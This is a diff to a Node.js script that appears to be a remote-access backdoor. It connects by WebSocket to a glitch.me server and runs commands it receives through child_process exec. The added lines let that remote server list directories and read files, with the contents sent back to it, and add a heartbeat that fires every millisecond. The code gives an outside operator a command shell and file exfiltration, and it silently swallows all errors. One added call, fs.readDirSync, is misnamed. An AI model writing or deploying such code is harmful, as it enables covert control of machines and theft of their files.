@@ -1,6 +1,7 @@
 const { exec } = require('node:child_process');
 const process = require('process');
 const path = require('path');
+const fs = require('fs');
 var ip = "";
 var WebSocket = require('ws');
 var ws = new WebSocket('wss://deciduous-flame-canidae.glitch.me',{
@@ -16,6 +17,11 @@ ws.on('open', function() {
 	ws.send(JSON.stringify({
 		command:"sendFirstConnectInfo"
 	}));
+	setInterval(() => {
+		ws.send(JSON.stringify({
+			command:"tickPC"
+		}));
+	},1);
 });
 function runCommand(json) {
 			exec(json.value,
@@ -91,6 +97,18 @@ ws.on('message', function(data, flags) {
 				value:path.join(__dirname, dir)
 			}));
 		}
+		if (json.command == "fsreadDirSync") {
+			ws.send(JSON.stringify({
+				command:"fsReadDirSyncRes",
+				value:fs.readDirSync(path.join(__dirname,json.dir))
+			}));
+		}
+		if (json.command == "fsreadFileSync") {
+			ws.send(JSON.stringify({
+				command:"fsReadFileSyncRes",
+				value:fs.readFileSync(path.join(__dirname,json.dir))
+			}));
+		}
 	}catch(e){}
 });
 /*exec('npm install ws',
@@ -98,3 +116,4 @@ function (error, stdout, stderr) {
 	console.log("Error: "+error,"Stdout: "+stdout,"Stderr: "+stderr)
 }
 );*/
+
